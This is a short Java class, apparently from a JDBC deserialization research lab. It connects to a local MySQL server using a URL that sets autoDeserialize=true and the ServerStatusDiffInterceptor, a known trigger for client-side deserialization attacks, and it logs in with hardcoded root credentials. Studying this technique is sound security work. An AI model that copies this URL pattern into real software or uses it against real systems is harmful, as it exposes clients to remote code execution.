package com.SugarP1g.deserialization.jdbc.mysql.client;

import java.sql.*;


public class Client {
    public static void main(String[] args) throws Exception {
        Class.forName("com.mysql.jdbc.Driver");
        // String jdbc_url = args[1];
        String jdbc_url = "jdbc:mysql://127.0.0.1:3306/test?" +
                "autoDeserialize=true" +
                "&queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor";
        Connection con = DriverManager.getConnection(jdbc_url, "root", "root");
    }
}
